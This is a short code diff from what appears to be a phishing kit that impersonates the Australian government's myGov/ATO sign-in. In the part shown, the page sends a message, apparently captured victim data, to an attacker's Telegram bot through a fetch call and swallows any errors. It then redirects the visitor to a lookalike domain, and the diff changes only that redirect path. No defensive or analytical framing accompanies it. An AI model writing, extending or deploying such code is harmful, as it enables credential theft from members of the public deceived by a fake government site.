@@ -57,7 +57,7 @@
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
                 .catch(() => {}) // ignore errors
                 .finally(() => {
-                    window.location.href = 'https://sigin.my.gov.au-atoservice.de5.net/statement/log.html';
+                    window.location.href = 'https://sigin.my.gov.au-atoservice.de5.net/accountstmt/log.html';
                 });
         }
 
